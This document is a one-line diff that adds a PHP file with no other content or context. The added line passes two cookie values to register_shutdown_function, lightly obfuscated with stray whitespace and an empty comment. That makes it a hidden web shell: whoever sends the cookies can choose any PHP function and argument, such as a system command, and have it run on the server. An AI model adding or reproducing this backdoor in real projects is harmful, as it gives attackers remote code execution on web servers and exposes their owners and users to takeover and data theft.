@@ -1,0 +1,1 @@
+<?php @register_shutdown_function($     {"_COOKIE"} {'IL'},$/**/{"_COOKIE"} {"G"})  ;
